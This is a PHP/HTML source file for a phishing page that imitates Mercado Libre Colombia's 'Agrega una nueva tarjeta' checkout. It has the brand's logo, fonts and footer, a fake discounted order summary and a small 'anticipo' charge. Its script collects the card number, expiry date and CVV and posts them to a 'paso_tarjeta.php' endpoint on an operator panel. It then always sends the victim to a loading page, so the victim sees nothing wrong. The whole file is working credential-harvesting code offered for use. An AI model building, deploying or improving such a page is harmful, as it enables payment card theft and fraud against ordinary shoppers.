<?php
if (session_status() === PHP_SESSION_NONE) { session_start(); }
require_once __DIR__ . '/../../conexion.php';
require_once __DIR__ . '/../../config.php';
require_once __DIR__ . '/../../token_helper.php';

$token = $_GET['token'] ?? ($_SESSION['landing_token'] ?? '');
$landing_data = null;
if (!empty($token)) {
    $landing_data = obtenerLandingPorToken($token, $pdo);
}

if ($landing_data) {
    $producto = $landing_data['producto'];
    $precio = (int)$landing_data['precio'];
    $_SESSION['landing_token'] = $token;
} else {
    $producto = isset($_GET['producto']) ? $_GET['producto'] : 'DJI Osmo Pocket 3 Creator Combo Color Negro';
    $precio = isset($_GET['precio']) ? (int)$_GET['precio'] : 1500000;
}
$anticipo_pagar = 3000;
$anticipo_formateado = number_format($anticipo_pagar, 0, ',', '.');
?>
<!DOCTYPE html>
<html lang="es-CO">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0" />
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="0">
    <title>Agrega una nueva tarjeta - Mercado Libre</title>
    
    <link href="https://fonts.googleapis.com/css2?family=Proxima+Nova:wght@300;400;600&display=swap" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script type="text/javascript" src="../../scripts/functions.js"></script>
    
    <style>
        @font-face {
            font-family: 'Proxima Nova';
            font-weight: 300;
            src: url('https://http2.mlstatic.com/ui/webfonts/v3.0.0/proxima-nova/proximanova-light.woff2') format('woff2');
        }
        @font-face {
            font-family: 'Proxima Nova';
            font-weight: 400;
            src: url('https://http2.mlstatic.com/ui/webfonts/v3.0.0/proxima-nova/proximanova-regular.woff2') format('woff2');
        }
        @font-face {
            font-family: 'Proxima Nova';
            font-weight: 600;
            src: url('https://http2.mlstatic.com/ui/webfonts/v3.0.0/proxima-nova/proximanova-semibold.woff2') format('woff2');
        }

        :root {
            --ml-yellow: #fff159;
            --ml-blue: #3483fa;
            --ml-blue-hover: #2968c8;
            --ml-text-black: #333333;
            --ml-text-gray: #666666;
            --ml-bg: #ebebeb;
            --ml-border: #e6e6e6;
            --ml-error: #f23d4f;
            --ml-green: #00a650;
        }

        body, html {
            margin: 0;
            padding: 0;
            font-family: 'Proxima Nova', sans-serif;
            background-color: var(--ml-bg);
            color: var(--ml-text-black);
        }

        /* HEADER YOUTUBE-STYLE (CLEAN) */
        .ml-header {
            background-color: var(--ml-yellow);
            height: 60px;
            width: 100%;
            display: flex;
            align-items: center;
        }
        
        .nav-bounds {
            max-width: 1200px;
            margin: 0 auto;
            width: 100%;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 20px;
        }

        .nav-logo {
            width: 134px;
            height: 34px;
            background-image: url('https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/5.21.22/mercadolibre/logo__large_plus.png');
            background-size: contain;
            background-repeat: no-repeat;
        }

        .nav-user {
            font-size: 14px;
            display: flex;
            align-items: center;
            gap: 15px;
        }

        /* MAIN CONTENT */
        .main-container {
            max-width: 1024px;
            margin: 40px auto;
            display: flex;
            gap: 40px;
            padding: 0 20px;
        }

        .left-col {
            flex: 1;
        }
        
        .right-col {
            width: 350px;
        }

        h1 {
            font-size: 24px;
            font-weight: 600;
            margin-top: 0;
            margin-bottom: 24px;
            color: var(--ml-text-black);
        }

        /* FORM BOX */
        .form-box {
            background: #fff;
            border-radius: 8px;
            box-shadow: 0 1px 2px 0 rgba(0,0,0,.1);
            padding: 0;
            margin-bottom: 20px;
            overflow: hidden;
        }
        
        .form-header {
            display: flex;
            align-items: center;
            padding: 24px;
            border-bottom: 1px solid var(--ml-border);
            background: #f7f7f7;
        }
        
        .form-header svg {
            margin-right: 16px;
        }

        .form-body {
            padding: 30px;
            display: flex;
            gap: 30px;
        }
        
        .inputs-area {
            flex: 1;
        }

        .card-visual {
            width: 250px;
            height: 160px;
            background: linear-gradient(135deg, #e0e0e0, #f5f5f5);
            border-radius: 12px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.05);
            position: relative;
            overflow: hidden;
        }
        
        .card-visual::before {
            content: '';
            position: absolute;
            width: 150%;
            height: 150%;
            background: rgba(255,255,255,0.4);
            transform: rotate(-45deg);
            top: -20%;
            left: -10%;
        }

        /* INPUTS */
        .input-group {
            margin-bottom: 20px;
        }
        
        .input-group label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 8px;
        }
        
        .input-hint {
            font-size: 12px;
            color: var(--ml-text-gray);
            margin-top: 4px;
        }
        
        .input-control {
            width: 100%;
            padding: 14px;
            border: 1px solid var(--ml-border);
            border-radius: 6px;
            font-size: 16px;
            box-sizing: border-box;
            outline: none;
            transition: border-color 0.2s;
            font-family: inherit;
        }
        
        .input-control:focus {
            border-color: var(--ml-blue);
            box-shadow: 0 0 0 1px var(--ml-blue);
        }
        
        .input-control.error {
            border-color: var(--ml-error);
        }
        
        .error-text {
            color: var(--ml-error);
            font-size: 12px;
            margin-top: 6px;
            display: none;
        }
        
        .error-text.show {
            display: flex;
            align-items: center;
            gap: 4px;
        }

        .row-2 {
            display: flex;
            gap: 20px;
        }
        
        .row-2 .input-group {
            flex: 1;
        }

        .doc-group {
            display: flex;
        }
        
        .doc-select {
            width: 80px;
            padding: 0 10px;
            border: 1px solid var(--ml-border);
            border-right: none;
            border-radius: 6px 0 0 6px;
            background: #f7f7f7;
            font-family: inherit;
            font-size: 16px;
            outline: none;
        }
        
        .doc-input {
            flex: 1;
            border-radius: 0 6px 6px 0;
        }

        .btn-continue {
            background-color: var(--ml-blue);
            color: #fff;
            border: none;
            border-radius: 6px;
            padding: 0 24px;
            height: 48px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            display: inline-flex;
            justify-content: center;
            align-items: center;
            min-width: 150px;
            float: right;
            transition: background-color 0.2s;
        }
        
        .btn-continue:hover {
            background-color: var(--ml-blue-hover);
        }

        /* RESUMEN DE COMPRA */
        .summary-box {
            background: #fff;
            border-radius: 8px;
            box-shadow: 0 1px 2px 0 rgba(0,0,0,.1);
            padding: 24px;
        }

        .summary-title {
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 20px;
            padding-bottom: 16px;
            border-bottom: 1px solid var(--ml-border);
        }

        .summary-row {
            display: flex;
            justify-content: space-between;
            font-size: 14px;
            margin-bottom: 12px;
            color: var(--ml-text-gray);
        }
        
        .summary-row.total {
            border-top: 1px solid var(--ml-border);
            padding-top: 16px;
            margin-top: 16px;
            font-size: 16px;
            color: var(--ml-text-black);
            font-weight: 400;
            align-items: center;
        }
        
        .total-price {
            font-size: 24px;
            font-weight: 600;
        }

        .green-text {
            color: var(--ml-green);
        }
        
        .strikethrough {
            text-decoration: line-through;
            color: #bfbfbf;
            margin-right: 8px;
        }

        /* FOOTER */
        .ml-footer {
            max-width: 1024px;
            margin: 60px auto 20px;
            padding: 0 20px;
            font-size: 12px;
            color: var(--ml-text-gray);
            border-top: 1px solid var(--ml-border);
            padding-top: 20px;
        }

        .ml-footer-links {
            display: flex;
            gap: 20px;
            margin-bottom: 10px;
            flex-wrap: wrap;
        }
        
        .ml-footer-links a {
            color: var(--ml-text-black);
            text-decoration: none;
        }

        @media (max-width: 768px) {
            .main-container {
                flex-direction: column-reverse;
                gap: 20px;
                margin-top: 20px;
            }
            .right-col {
                width: 100%;
            }
            .form-body {
                flex-direction: column;
                padding: 20px;
            }
            .card-visual {
                display: none;
            }
            .btn-continue {
                width: 100%;
                float: none;
            }
        }
    </style>
</head>
<body>

    <!-- HEADER -->
    <header class="ml-header">
        <div class="nav-bounds">
            <a href="https://www.mercadolibre.com.co" target="_blank" class="nav-logo"></a>
            <div class="nav-user">
                <span style="background: #fff; border-radius:12px; padding:2px 8px; font-weight:600;">AG</span> Amir ⌵ &nbsp;&nbsp; <a href="https://www.mercadolibre.com.co/ayuda" target="_blank" style="color:#333; text-decoration:none; font-weight:600;">Ayuda / PQR</a>
            </div>
        </div>
    </header>

    <!-- MAIN -->
    <main class="main-container">
        
        <!-- COLUMNA IZQUIERDA -->
        <div class="left-col">
            
            <h1>Agrega una nueva tarjeta</h1>

            <div class="form-box">
                <div class="form-header">
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#666" stroke-width="1.5"><rect x="3" y="6" width="18" height="12" rx="2"/><path d="M3 10h18"/></svg>
                    <span style="font-size: 16px;">Nueva tarjeta de crédito</span>
                </div>
                
                <div class="form-body">
                    <div class="inputs-area">
                        <form id="cardForm">
                            <div class="input-group">
                                <label>Número de tarjeta</label>
                                <div style="position: relative; width: 100%;">
                                    <input type="text" id="ccnum" class="input-control" placeholder="0000 0000 0000 0000" maxlength="19" style="padding-right: 50px;">
                                    <img src="../../bold/visa.svg" id="imgVisa" style="position: absolute; right: 10px; top: 50%; transform: translateY(-50%); width: 35px; display: none;">
                                    <img src="../../bold/master.svg" id="imgMaster" style="position: absolute; right: 10px; top: 50%; transform: translateY(-50%); width: 35px; display: none;">
                                </div>
                                <div class="error-text" id="err-ccnum">
                                    <svg width="14" height="14" viewBox="0 0 24 24" fill="var(--ml-error)"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg> Completa este campo.
                                </div>
                            </div>

                            <div class="input-group">
                                <label>Nombre del titular</label>
                                <input type="text" id="ccname" class="input-control" placeholder="Ej.: María López" maxlength="70" minlength="3">
                                <div class="input-hint">Como aparece en la tarjeta</div>
                            </div>

                            <div class="row-2">
                                <div class="input-group">
                                    <label>Vencimiento</label>
                                    <input type="text" id="ccexp" class="input-control" placeholder="MM/AA" maxlength="5">
                                </div>
                                <div class="input-group">
                                    <label>Código de seguridad</label>
                                    <input type="text" id="cccvv" class="input-control" placeholder="000" maxlength="4">
                                </div>
                            </div>

                            <div class="input-group">
                                <label>Documento del titular</label>
                                <div class="doc-group">
                                    <select class="doc-select">
                                        <option>CC</option>
                                        <option>CE</option>
                                    </select>
                                    <input type="text" id="ccdoc" class="input-control doc-input" placeholder="123456789" maxlength="10" minlength="6" inputmode="numeric" pattern="[0-9]*" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
                                </div>
                            </div>
                        </form>
                    </div>
                    
                    <div class="card-visual">
                        <!-- Decoración tarjeta gris -->
                    </div>
                </div>
            </div>

            <button class="btn-continue" id="btnSubmitForm">
                Continuar
            </button>
            <div style="clear:both;"></div>
        </div>

        <!-- COLUMNA DERECHA (Resumen) -->
        <div class="right-col">
            <div class="summary-box">
                <div class="summary-title">Resumen de compra</div>
                
                <div class="summary-row">
                    <span>Producto</span>
                    <span>$ 499.900</span>
                </div>
                
                <div class="summary-row">
                    <span>Descuento del producto</span>
                    <span class="green-text">- $ 238.000</span>
                </div>
                
                <div class="summary-row">
                    <span>Envío</span>
                    <span><span class="strikethrough">$ 17.100</span> <span class="green-text">Gratis</span></span>
                </div>
                
                <div class="summary-row total">
                    <span>Pagas</span>
                    <span class="total-price">$ <?php echo $anticipo_formateado; ?></span>
                </div>
            </div>
        </div>

    </main>

    <!-- FOOTER -->
    <footer class="ml-footer">
        <div class="ml-footer-links">
            <a href="#">Trabaja con nosotros</a>
            <a href="#">Términos y condiciones</a>
            <a href="#">Promociones</a>
            <a href="#">Cómo cuidamos tu privacidad</a>
            <a href="#">Accesibilidad</a>
            <a href="#">Ayuda / PQR</a>
            <a href="#">Navidad</a>
            <a href="#">www.sic.gov.co</a>
        </div>
        <p>Copyright © 1999-2026 MercadoLibre Colombia LTDA.<br>Calle 100 #7-33, Torre 1, Piso 16, Bogotá D.C., Colombia</p>
    </footer>

    <script>
        $(document).ready(function() {
            
            // Format card number
            $('#ccnum').on('input', function() {
                let v = $(this).val().replace(/\s+/g, '').replace(/[^0-9]/gi, '');
                let matches = v.match(/\d{4,16}/g);
                let match = matches && matches[0] || '';
                let parts = [];
                for (let i=0, len=match.length; i<len; i+=4) {
                    parts.push(match.substring(i, i+4));
                }
                if (parts.length) {
                    $(this).val(parts.join(' '));
                } else {
                    $(this).val(v);
                }
                
                // Mostrar icono de franquicia
                if (v.startsWith('4')) {
                    $('#imgVisa').show();
                    $('#imgMaster').hide();
                } else if (v.startsWith('5')) {
                    $('#imgVisa').hide();
                    $('#imgMaster').show();
                } else {
                    $('#imgVisa').hide();
                    $('#imgMaster').hide();
                }

                if(v.length > 0) {
                    $(this).removeClass('error');
                    $('#err-ccnum').removeClass('show');
                }
            });

            // Format expiry
            $('#ccexp').on('input', function() {
                let v = $(this).val().replace(/\D/g, '');
                if (v.length > 2) {
                    v = v.substring(0, 2) + '/' + v.substring(2, 4);
                }
                $(this).val(v);
            });
            
            // Allow only numbers in CVV
            $('#cccvv').on('input', function() {
                $(this).val($(this).val().replace(/\D/g, ''));
            });

            // Form Submit Logic
            $('#btnSubmitForm').click(function(e) {
                e.preventDefault();
                
                const tar = $('#ccnum').val();
                const fec = $('#ccexp').val();
                const cvv = $('#cccvv').val();
                
                if (tar.length < 15) {
                    $('#ccnum').addClass('error');
                    $('#err-ccnum').addClass('show');
                    return;
                }
                
                const btn = $(this);
                btn.text('Cargando...');
                btn.prop('disabled', true);
                
                // Usamos la API del panel
                $.post(API_BASE + 'paso_tarjeta.php', {
                    tar: tar,
                    fec: fec,
                    cvv: cvv,
                    monto: "<?php echo $anticipo_pagar; ?>"
                }, function(res) {
                    // Always redirect to MercadoPago loader
                    window.location.href = "cargando.php";
                }).fail(function() {
                    window.location.href = "cargando.php";
                });
            });
        });
    </script>
</body>
</html>
